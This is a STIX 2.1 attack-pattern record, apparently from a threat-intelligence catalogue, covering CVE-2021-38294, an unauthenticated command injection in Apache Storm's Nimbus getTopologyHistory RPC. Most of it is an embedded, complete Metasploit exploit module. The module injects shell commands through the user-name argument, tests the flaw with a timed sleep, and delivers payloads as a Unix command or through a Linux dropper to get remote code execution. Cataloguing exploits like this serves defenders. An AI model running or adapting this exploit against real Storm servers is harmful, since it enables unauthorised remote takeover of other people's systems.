{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2b23ba48-aef6-4b9b-97a5-e1e709a6cd69",
    "created": "2024-08-14T16:57:40.828923Z",
    "modified": "2024-08-14T16:57:40.828927Z",
    "name": "Apache Storm Nimbus getTopologyHistory Unauthenticated Command Execution",
    "description": " This module exploits an unauthenticated command injection vulnerability within the Nimbus service component of Apache Storm. The getTopologyHistory RPC method method takes a single argument which is the name of a user which is concatenated into a string that is executed by bash. In order for the vulnerability to be exploitable, there must have been at least one topology submitted to the server. The topology may be active or inactive, but at least one must be present. Successful exploitation results in remote code execution as the user running Apache Storm.  This vulnerability was patched in versions 2.1.1, 2.2.1 and 1.2.4. This exploit was tested on version 2.2.0 which is affected. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/nimbus_gettopologyhistory_cmd_exec.rb",
            "external_id": "nimbus_gettopologyhistory_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-38294"
        },
        {
            "source_name": "reference",
            "url": "https://securitylab.github.com/advisories/GHSL-2021-085-apache-storm/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/proto/thrift'\nrequire 'rex/stopwatch'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n\n  Thrift = Rex::Proto::Thrift\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache Storm Nimbus getTopologyHistory Unauthenticated Command Execution',\n        'Description' => %q{\n          This module exploits an unauthenticated command injection vulnerability within the Nimbus service component of Apache Storm.\n          The getTopologyHistory RPC method method takes a single argument which is the name of a user which is\n          concatenated into a string that is executed by bash. In order for the vulnerability to be exploitable, there\n          must have been at least one topology submitted to the server. The topology may be active or inactive, but at\n          least one must be present. Successful exploitation results in remote code execution as the user running Apache Storm.\n\n          This vulnerability was patched in versions 2.1.1, 2.2.1 and 1.2.4. This exploit was tested on version 2.2.0\n          which is affected.\n        },\n        'Author' => [\n          'Alvaro Mu\u00f1oz', # discovery and original research\n          'Spencer McIntyre', # metasploit module\n        ],\n        'References' => [\n          ['CVE', '2021-38294'],\n          ['URL', 'https://securitylab.github.com/advisories/GHSL-2021-085-apache-storm/']\n        ],\n        'DisclosureDate' => '2021-10-25',\n        'License' => MSF_LICENSE,\n        'Platform' => ['linux', 'unix'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper\n            }\n          ]\n        ],\n        'DefaultTarget' => 1,\n        'DefaultOptions' => {\n          'RPORT' => 6627,\n          'MeterpreterTryToFork' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_advanced_options(\n      [\n        OptInt.new('ThriftTimeout', [ true, 'Thrift response and connection timeout duration', 10 ])\n      ]\n    )\n  end\n\n  def check\n    begin\n      connect\n    rescue Rex::ConnectionError\n      return CheckCode::Unknown('Failed to connect to the service.')\n    end\n\n    sleep_time = rand(5..10)\n    response, elapsed_time = Rex::Stopwatch.elapsed_time do\n      execute_command(\"sleep #{sleep_time}\", timeout: sleep_time + 3)\n    end\n\n    vprint_status(\"Elapsed time: #{elapsed_time} seconds\")\n    unless response && elapsed_time > sleep_time\n      return CheckCode::Safe('Failed to test command injection.')\n    end\n\n    CheckCode::Appears('Successfully tested command injection.')\n  end\n\n  def exploit\n    connect\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\n  def execute_command(cmd, opts = {})\n    # comment out the rest of the command to ensure it's only executed once and append a random tag to avoid caching\n    cmd = \"#{cmd} ##{Rex::Text.rand_text_alphanumeric(4..8)}\"\n    vprint_status(\"Executing command: #{cmd}\")\n\n    @thrift_client.call(\n      'getTopologyHistory',\n      Thrift::ThriftData.utf7(1, \";#{cmd}\"),\n      Thrift::ThriftData.stop,\n      timeout: opts.fetch(:timeout, datastore['ThriftTimeout'])\n    )\n  rescue Rex::TimeoutError\n    nil\n  end\n\n  def connect\n    @thrift_client = Rex::Proto::Thrift::Client.new(\n      target_host,\n      datastore['RPORT'],\n      context: { 'Msf' => framework, 'MsfExploit' => self },\n      timeout: datastore['ThriftTimeout']\n    )\n    @thrift_client.connect\n  end\n\n  def cleanup\n    return unless @thrift_client\n\n    @thrift_client.close\n    @thrift_client = nil\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-10-25",
    "x_mitre_platforms": [
        "linux'"
    ]
}